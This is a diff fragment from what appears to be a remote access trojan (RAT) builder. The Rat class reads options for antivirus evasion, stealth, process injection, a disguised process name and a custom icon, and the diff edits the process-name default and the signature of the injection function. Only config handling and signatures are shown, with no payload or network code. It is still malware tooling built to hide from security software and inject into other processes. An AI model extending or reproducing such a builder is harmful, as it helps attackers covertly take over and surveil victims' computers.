@@ -839,7 +839,7 @@ class Rat:
         anivirue = config['ANTIVIRUS_EVASION']
         stealth = config['STEALTH']
         process_injection = config['PROCESS_INJECTION']
-        process_name = config['PROCESS_NAME']
+        process_name = config['PROCESS_NAME'] if process_injection else 'iraqisgreat'
         outputname = config['OUTPUT_NAME']
         iconpath = config['ICON_PATH']
         client_code = r'''
@@ -995,7 +995,7 @@ def hide_process():
             pass
 
 
-def inject_into_process(target_process_name):
+def inject_into_process(target_process_name=None):
     if %s:
         try:
             target_process = None
